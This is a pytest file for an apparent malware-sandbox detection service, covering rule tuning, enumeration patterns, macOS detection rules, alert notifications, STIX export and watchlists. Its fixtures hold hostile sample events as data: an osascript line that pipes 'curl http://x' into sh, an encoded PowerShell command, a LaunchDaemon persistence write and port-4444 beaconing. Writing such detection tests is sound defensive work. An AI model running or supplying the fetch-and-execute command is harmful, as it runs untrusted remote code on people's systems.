"""Tests for roadmap items 2.3 (rule tuning), 3.1 (notifications), 3.2
(macOS rules), and 3.3 (STIX export + watchlist import/export)."""

from datetime import datetime, timedelta, timezone

from .conftest import make_run
from ..core.schema import Alert
from ..services import detection, stix as stix_service


def _ts(offset_seconds: int) -> str:
    return (datetime.now(timezone.utc) - timedelta(seconds=offset_seconds)).isoformat()


def _linux_conn(run_id: str, ip: str, ts: str, pid: int = 3000) -> dict:
    return {
        "run_id": run_id, "platform": "linux", "event_type": "network_connection",
        "timestamp": ts, "pid": pid, "dest_ip": ip, "dest_port": 4444, "protocol": "tcp",
    }


def _macos_write(run_id: str, path: str, ts: str, pid: int = 1000) -> dict:
    return {
        "run_id": run_id, "platform": "macos", "event_type": "file_write",
        "timestamp": ts, "pid": pid, "file_path": path,
    }


def _proc(run_id: str, name: str, cmdline: str, ts: str, pid: int, ppid: int = 1) -> dict:
    return {
        "run_id": run_id, "platform": "macos", "event_type": "process_create",
        "timestamp": ts, "pid": pid, "ppid": ppid, "process_name": name, "command_line": cmdline,
    }


# -- Enumeration pattern tables (rule 15) ----------------------------------------


def _enum_proc(run_id: str, name: str, cmdline: str, ts: str, pid: int) -> dict:
    return {
        "run_id": run_id, "platform": "linux", "event_type": "process_create",
        "timestamp": ts, "pid": pid, "ppid": 1, "process_name": name, "command_line": cmdline,
    }


def test_enum_patterns_list_exposes_platforms_and_defaults(client):
    resp = client.get("/rules/enum-patterns")
    assert resp.status_code == 200
    body = resp.json()
    assert set(body["platforms"]) == {"windows", "linux", "macos"}
    assert body["defaults"] == body["platforms"]  # untouched == stock
    assert any(r["pattern"] == r"\bwhoami\b" for r in body["platforms"]["linux"])


def test_enum_patterns_override_applies_live_to_detection(client):
    """A custom recon command added via the editor fires enumeration-burst on
    the next ingested batch; deleting the override restores stock behavior."""
    marker = "custom-recon-tool-9f"  # distinctive — never in defaults
    resp = client.get("/rules/enum-patterns").json()
    linux = list(resp["platforms"]["linux"])
    linux.append({"pattern": rf"\b{marker}\b", "label": "custom recon marker"})
    put = client.put("/rules/enum-patterns", json={"patterns": {**resp["platforms"], "linux": linux}})
    assert put.status_code == 200

    try:
        # Two stock commands + the custom one = 3 distinct kinds → fires.
        run_id = make_run(client, sample_name=f"enum-ov-{marker}.bin", platform="linux")
        client.post("/ingest/batch", json=[
            _enum_proc(run_id, "whoami", "whoami", _ts(5), pid=901),
            _enum_proc(run_id, "uname", "uname -a", _ts(4), pid=902),
            _enum_proc(run_id, marker, f"{marker} --dump-all", _ts(3), pid=903),
        ])
        alerts = client.get(f"/runs/{run_id}/alerts").json()
        burst = [a for a in alerts if a["rule_id"] == "enumeration-burst"]
        assert len(burst) == 1
        assert "custom recon marker" in burst[0]["details"]

        # Without the override, the custom command no longer counts — two
        # distinct kinds stay under the threshold and nothing fires.
        assert client.delete("/rules/enum-patterns").status_code == 204
        run2 = make_run(client, sample_name=f"enum-reset-{marker}.bin", platform="linux")
        client.post("/ingest/batch", json=[
            _enum_proc(run2, "whoami", "whoami", _ts(5), pid=911),
            _enum_proc(run2, "uname", "uname -a", _ts(4), pid=912),
            _enum_proc(run2, marker, f"{marker} --dump-all", _ts(3), pid=913),
        ])
        alerts2 = client.get(f"/runs/{run2}/alerts").json()
        assert not any(a["rule_id"] == "enumeration-burst" for a in alerts2)

        # And the list endpoint reports stock again.
        assert client.get("/rules/enum-patterns").json()["platforms"] == resp["platforms"]
    finally:
        client.delete("/rules/enum-patterns")  # never leak the override


def test_enum_patterns_rejects_unknown_platform(client):
    resp = client.get("/rules/enum-patterns").json()
    bad = client.put("/rules/enum-patterns", json={"patterns": {**resp["platforms"], "plan9": []}})
    assert bad.status_code == 422


# -- Roadmap 2.3: rule tuning ---------------------------------------------------


def test_tuning_list_exposes_defaults(client):
    resp = client.get("/rules/tuning")
    assert resp.status_code == 200
    body = resp.json()
    assert body["count"] >= 5
    by_param = {k["param"]: k for k in body["knobs"]}
    assert by_param["BEACON_MIN_CONNECTIONS"]["default"] == 5
    assert by_param["BEACON_MIN_CONNECTIONS"]["tuned"] is False


def test_tuning_set_and_reset(client):
    resp = client.put("/rules/tuning/BEACON_MIN_CONNECTIONS", json={"value": "3"})
    assert resp.status_code == 200
    assert resp.json()["current"] == "3"

    body = client.get("/rules/tuning").json()
    knob = next(k for k in body["knobs"] if k["param"] == "BEACON_MIN_CONNECTIONS")
    assert knob["current"] == 3 and knob["tuned"] is True

    # Setting 422s on a non-numeric value for an int knob.
    bad = client.put("/rules/tuning/BEACON_MIN_CONNECTIONS", json={"value": "abc"})
    assert bad.status_code == 422

    resp = client.delete("/rules/tuning/BEACON_MIN_CONNECTIONS")
    assert resp.status_code == 204
    body = client.get("/rules/tuning").json()
    knob = next(k for k in body["knobs"] if k["param"] == "BEACON_MIN_CONNECTIONS")
    assert knob["tuned"] is False and knob["current"] == 5


def test_tuning_changes_detection_behavior(client):
    """Lower BEACON_MIN_CONNECTIONS → a 3-connection beacon now fires."""
    run_id = client.post("/runs", json={"sample_name": "tune.bin", "platform": "linux"}).json()["run_id"]
    assert client.put("/rules/tuning/BEACON_MIN_CONNECTIONS", json={"value": "3"}).status_code == 200
    try:
        for i in range(3):
            client.post(
                "/ingest/batch",
                json=[_linux_conn(run_id, "203.0.113.99", _ts(30 - i * 2), pid=3000 + i)],
            )
        alerts = client.get(f"/runs/{run_id}/alerts").json()
        assert any(a["rule_id"] == "beaconing" for a in alerts)
    finally:
        client.delete("/rules/tuning/BEACON_MIN_CONNECTIONS")


# -- Rule packs: versioned, diffable rule-set export/import --------------------


def test_rule_pack_round_trip(client):
    """Export → mutate → re-import the pack → state matches the export."""
    # Mutate: one tuned knob, one suppression, custom enum pattern.
    client.put("/rules/tuning/BEACON_MIN_CONNECTIONS", json={"value": "3"})
    client.post(
        "/rules/suppressions",
        json={"rule_id": "beaconing", "reason": "pack test"},
    )
    enum_resp = client.get("/rules/enum-patterns").json()
    custom = enum_resp["platforms"]
    custom["linux"].append({"pattern": "pack-util", "label": "pack test"})
    client.put("/rules/enum-patterns", json={"patterns": custom})

    pack = client.get("/rules/pack").json()
    assert pack["schema"] == 1
    assert any(k["param"] == "BEACON_MIN_CONNECTIONS" and k["tuned"] for k in pack["tuning"])
    assert any(s["rule_id"] == "beaconing" and s["run_id"] is None for s in pack["suppressions"])
    assert any(p["pattern"] == "pack-util" for p in pack["enum_patterns"]["linux"])

    # Revert everything to defaults, then re-import the pack.
    client.delete("/rules/tuning/BEACON_MIN_CONNECTIONS")
    client.delete("/rules/enum-patterns")
    for s in client.get("/rules/suppressions").json():
        client.delete(f"/rules/suppressions/{s['id']}")

    summary = client.post("/rules/pack", json=pack).json()
    assert summary["tuning_applied"] >= 1
    assert summary["suppressions_added"] == 1
    assert summary["enum_patterns_applied"] is True

    knob = next(k for k in client.get("/rules/tuning").json()["knobs"] if k["param"] == "BEACON_MIN_CONNECTIONS")
    assert knob["tuned"] is True and knob["current"] == 3
    assert any(s["rule_id"] == "beaconing" for s in client.get("/rules/suppressions").json())
    assert any(p["pattern"] == "pack-util" for p in client.get("/rules/enum-patterns").json()["platforms"]["linux"])

    # Clean up the pack's suppression so later tests see a clean scope.
    for s in client.get("/rules/suppressions").json():
        if s["rule_id"] == "beaconing" and s["run_id"] is None:
            client.delete(f"/rules/suppressions/{s['id']}")


def test_rule_pack_rejects_future_schema_and_unknown_knob(client):
    pack = client.get("/rules/pack").json()
    bad_schema = {**pack, "schema": 99}
    assert client.post("/rules/pack", json=bad_schema).status_code == 422
    bad_knob = {**pack, "tuning": [{"param": "NOT_A_KNOB", "rule_id": "x", "current": 1, "tuned": True}]}
    assert client.post("/rules/pack", json=bad_knob).status_code == 422


def test_rule_pack_suppressions_are_idempotent(client):
    """Re-importing a pack never duplicates an identical suppression scope."""
    # Start from a clean scope (shared DB — other tests may have added one).
    for s in client.get("/rules/suppressions").json():
        if s["rule_id"] == "beaconing" and s["run_id"] is None:
            client.delete(f"/rules/suppressions/{s['id']}")
    pack = client.get("/rules/pack").json()
    pack["suppressions"] = [{"rule_id": "beaconing", "run_id": None, "reason": "idem"}]
    first = client.post("/rules/pack", json=pack).json()
    second = client.post("/rules/pack", json=pack).json()
    assert first["suppressions_added"] == 1
    assert second["suppressions_added"] == 0 and second["suppressions_skipped"] == 1


# -- Roadmap 3.2: macOS rules ----------------------------------------------------


def test_macos_run_create_allowed(client):
    resp = client.post("/runs", json={"sample_name": "mac.bin", "platform": "macos"})
    assert resp.status_code == 201
    assert resp.json()["run_id"]


def test_macos_launchagent_persistence_fires(client):
    run_id = client.post("/runs", json={"sample_name": "launch.bin", "platform": "macos"}).json()["run_id"]
    client.post("/ingest/batch", json=[_macos_write(run_id, "/Library/LaunchDaemons/com.evil.plist", _ts(5))])
    alerts = client.get(f"/runs/{run_id}/alerts").json()
    assert any(a["rule_id"] == "autostart-persistence" for a in alerts)


def test_macos_osascript_lolbin_fires(client):
    run_id = client.post("/runs", json={"sample_name": "osa.bin", "platform": "macos"}).json()["run_id"]
    client.post(
        "/ingest/batch",
        json=[
            _proc(
                run_id, "osascript",
                "osascript -e 'do shell script \"curl http://x | sh\"'",
                _ts(5), pid=2000,
            )
        ],
    )
    alerts = client.get(f"/runs/{run_id}/alerts").json()
    assert any(a["rule_id"] == "lolbin-abuse" and "osascript" in a["details"] for a in alerts)


def test_macos_windows_event_does_not_fire_linux_rule(client):
    # A windows-path write that merely contains a macOS string must not fire.
    run_id = client.post("/runs", json={"sample_name": "w.bin", "platform": "windows"}).json()["run_id"]
    client.post(
        "/ingest/batch",
        json=[{
            "run_id": run_id, "platform": "windows", "event_type": "file_write",
            "timestamp": _ts(5), "pid": 1,
            "file_path": r"C:\\Users\\victim\\LaunchAgents\\evil.plist",
        }],
    )
    assert client.get(f"/runs/{run_id}/alerts").json() == []


# -- Roadmap 3.1: notifications ---------------------------------------------------


def test_runs_filter_by_sample_name(client):
    """Sample vault → detonation history: GET /runs?q=<sample> filters."""
    a = make_run(client, sample_name="qfilter-sample-a.exe")
    make_run(client, sample_name="qfilter-sample-b.exe")
    hit = client.get("/runs", params={"q": "qfilter-sample-a", "include_synthetic": "true"}).json()
    assert [r["run_id"] for r in hit] == [a]
    miss = client.get("/runs", params={"q": "no-such-sample-xyz", "include_synthetic": "true"}).json()
    assert miss == []


def test_notifications_settings_roundtrip(client):
    resp = client.put("/notifications/settings", json={"webhook_url": "http://hook.local/x"})
    assert resp.status_code == 200
    assert resp.json()["enabled"] is True
    got = client.get("/notifications/settings").json()
    assert got["webhook_url"] == "http://hook.local/x"

    client.put("/notifications/settings", json={"webhook_url": ""})
    assert client.get("/notifications/settings").json()["enabled"] is False


def test_webhook_fires_on_malicious_alert(client, monkeypatch):
    """A malicious alert POSTs to the webhook; a clean/suspicious one doesn't."""
    captured: list[dict] = []

    class FakeResp:
        def raise_for_status(self):
            return None

    class FakeClient:
        def __init__(self, *a, **k):
            pass

        async def __aenter__(self):
            return self

        async def __aexit__(self, *a):
            return False

        async def post(self, url, json=None):
            captured.append({"url": url, "json": json})
            return FakeResp()

    import httpx

    monkeypatch.setattr(httpx, "AsyncClient", FakeClient)
    client.put("/notifications/settings", json={"webhook_url": "http://hook.test/alert"})

    from ..services.notifications import _payload

    alerts = [
        Alert(
            run_id="x", rule_id="lolbin-abuse", rule_name="LOLBin", severity="malicious",
            triggered_at=datetime.now(timezone.utc), details="bad",
        ),
        Alert(
            run_id="x", rule_id="first-seen", rule_name="Novelty", severity="suspicious",
            triggered_at=datetime.now(timezone.utc), details="meh",
        ),
    ]
    import asyncio

    urls = asyncio.run(_send(client, alerts))
    assert urls == ["http://hook.test/alert"]
    assert len(captured) == 1  # only the malicious one
    assert captured[0]["json"]["severity"] == "malicious"


async def _send(client, alerts):
    # Import inside to avoid a circular import at module scope.
    from ..services.notifications import notify_new_alerts

    return await notify_new_alerts(alerts)


# -- Roadmap 3.1b: multi-channel notifications -----------------------------------


def _capture_http(monkeypatch):
    """Monkeypatch httpx.AsyncClient to capture POSTs; returns the list."""
    captured: list[dict] = []

    class FakeResp:
        def raise_for_status(self):
            return None

    class FakeClient:
        def __init__(self, *a, **k):
            pass

        async def __aenter__(self):
            return self

        async def __aexit__(self, *a):
            return False

        async def post(self, url, json=None):
            captured.append({"url": url, "json": json})
            return FakeResp()

    import httpx

    monkeypatch.setattr(httpx, "AsyncClient", FakeClient)
    return captured


def _mal_alert() -> Alert:
    return Alert(
        run_id="multi", rule_id="beaconing", rule_name="Beaconing", severity="malicious",
        triggered_at=datetime.now(timezone.utc), details="203.0.113.9:4444 x5",
    )


def test_notifications_settings_full_roundtrip_and_password_masking(client):
    body = {
        "webhook_url": "http://hook.local/a",
        "slack_webhook": "http://hooks.slack.com/b",
        "discord_webhook": "http://discord.com/api/webhooks/c",
        "telegram_bot_token": "123:ABC",
        "telegram_chat_id": "-10042",
        "smtp_host": "smtp.example.com",
        "smtp_port": 587,
        "smtp_user": "soc@example.com",
        "smtp_pass": "hunter2",
        "smtp_from": "outpost@example.com",
        "smtp_to": "analyst@example.com",
    }
    resp = client.put("/notifications/settings", json=body)
    assert resp.status_code == 200
    got = resp.json()
    assert got["enabled"] is True
    assert got["smtp_host"] == "smtp.example.com"
    # Password is never echoed back; a set flag signals it exists.
    assert got["smtp_pass"] == "" and got["smtp_pass_set"] is True

    # A subsequent save with a blank password must retain the stored one.
    blank = client.put(
        "/notifications/settings",
        json={"webhook_url": "http://hook.local/a", "smtp_host": "smtp.example.com", "smtp_pass": ""},
    ).json()
    assert blank["smtp_pass_set"] is True

    # Clearing explicitly (new password or whitespace) updates it.
    cleared = client.put(
        "/notifications/settings",
        json={"webhook_url": "http://hook.local/a", "smtp_host": "smtp.example.com", "smtp_pass": "newpass"},
    ).json()
    assert cleared["smtp_pass_set"] is True

    # Disable everything → enabled flips off.
    off = client.put("/notifications/settings", json={}).json()
    assert off["enabled"] is False


def test_multi_channel_fanout_fires_each_configured_channel(client, monkeypatch):
    """One malicious alert delivers to webhook + slack + discord + telegram."""
    captured = _capture_http(monkeypatch)
    client.put(
        "/notifications/settings",
        json={
            "webhook_url": "http://hook.test/generic",
            "slack_webhook": "http://hooks.slack.test/soc",
            "discord_webhook": "http://discord.test/wc",
            "telegram_bot_token": "123:ABC",
            "telegram_chat_id": "-10042",
        },
    )
    import asyncio

    urls = asyncio.run(_send(client, [_mal_alert()]))
    assert len(urls) == 4  # all four channels attempted

    by_url = {c["url"]: c for c in captured}
    assert "http://hook.test/generic" in by_url  # generic webhook: raw JSON payload
    assert by_url["http://hook.test/generic"]["json"]["severity"] == "malicious"
    # Slack: text field; Discord: embed; Telegram: chat_id + text.
    assert "text" in by_url["http://hooks.slack.test/soc"]["json"]
    assert "embeds" in by_url["http://discord.test/wc"]["json"]
    tg = by_url["https://api.telegram.org/bot123:ABC/sendMessage"]["json"]
    assert tg["chat_id"] == "-10042" and "Beaconing" in tg["text"]


def test_smtp_fires_via_thread_when_configured(client, monkeypatch):
    """SMTP channel triggers the blocking send in a thread (captured calls)."""
    import asyncio
    import threading

    from ..services import notifications as notify

    calls: list[dict] = []
    orig = notify.asyncio.to_thread

    def fake_to_thread(fn, *args, **kwargs):
        fn(*args, **kwargs)
        return None

    monkeypatch.setattr(notify.asyncio, "to_thread", fake_to_thread)
    monkeypatch.setattr(
        notify.smtplib, "SMTP",
        lambda *a, **k: _FakeSmtp(calls),
    )
    client.put(
        "/notifications/settings",
        json={
            "smtp_host": "smtp.test", "smtp_port": 587,
            "smtp_user": "u", "smtp_pass": "p",
            "smtp_from": "outpost@test", "smtp_to": "a@test,b@test",
        },
    )
    asyncio.run(_send(client, [_mal_alert()]))
    assert len(calls) == 1
    assert calls[0]["subject"]
    assert "Beaconing" in calls[0]["subject"]


class _FakeSmtp:
    """Minimal smtplib.SMTP stand-in recording the message it sends."""

    def __init__(self, calls, *a, **k):
        self._calls = calls

    def __enter__(self):
        return self

    def __exit__(self, *a):
        return False

    def ehlo(self):
        return None

    def starttls(self, context=None):
        return None

    def login(self, user, pwd):
        return None

    def send_message(self, msg):
        self._calls.append({"subject": msg["Subject"]})



# -- Roadmap 3.3: STIX export ------------------------------------------------------


def test_stix_export_bundle_shape(client):
    run_id = client.post("/runs", json={"sample_name": "stix.bin", "platform": "windows"}).json()["run_id"]
    client.post(
        "/ingest/batch",
        json=[{
            "run_id": run_id, "platform": "windows", "event_type": "process_create",
            "timestamp": _ts(3), "pid": 1, "ppid": 0, "process_name": "powershell.exe",
            "command_line": "powershell.exe -enc SQBFAFgA",
        }],
    )
    # A malicious C2 connection gives the bundle its IP indicator.
    client.post(
        "/ingest/batch",
        json=[{
            "run_id": run_id, "platform": "windows", "event_type": "network_connection",
            "timestamp": _ts(2), "pid": 1, "dest_ip": "203.0.113.77", "dest_port": 4444,
        }],
    )
    bundle = client.get(f"/runs/{run_id}/export?format=stix").json()
    assert bundle["type"] == "bundle"
    assert bundle["spec_version"] == "2.1"
    types = {o["type"] for o in bundle["objects"]}
    assert "x-outpost-run" in types
    assert any(o["type"] == "indicator" for o in bundle["objects"])
    assert any(o["type"] == "observed-data" for o in bundle["objects"])
    # All ids are STIX-shaped.
    for o in bundle["objects"]:
        assert "--" in o["id"]


def test_stix_unknown_run_404(client):
    resp = client.get("/runs/nope/export?format=stix")
    assert resp.status_code == 404


# -- Roadmap 3.3: watchlist import/export ------------------------------------------


def test_watchlist_export_import_roundtrip(client):
    client.post("/watchlist", json={"value": "203.0.113.50", "label": "shared c2"})
    client.post("/watchlist", json={"value": "evil.example.com"})

    js = client.get("/watchlist/export?format=json").json()
    assert {"value": "203.0.113.50", "label": "shared c2"} in js

    # Remove just this test's two entries (the session DB may hold entries
    # from other tests), then re-import — labels must survive the roundtrip.
    for value in ("203.0.113.50", "evil.example.com"):
        client.delete(f"/watchlist/{value}")

    # Re-import only this test's two entries (the session DB may carry rows
    # added by earlier tests — they must not affect our count).
    mine = [e for e in js if e["value"] in ("203.0.113.50", "evil.example.com")]
    resp = client.post("/watchlist/import", json={"entries": mine})
    assert resp.status_code == 200
    assert resp.json()["imported"] == 2
    entries = client.get("/watchlist").json()
    labels = {e["value"]: e["label"] for e in entries}
    assert labels["203.0.113.50"] == "shared c2"
    assert labels["evil.example.com"] == "evil.example.com"


def test_watchlist_csv_export(client):
    client.post("/watchlist", json={"value": "1.2.3.4"})
    resp = client.get("/watchlist/export?format=csv")
    assert resp.status_code == 200
    assert resp.headers["content-type"].startswith("text/csv")
    assert "1.2.3.4" in resp.text
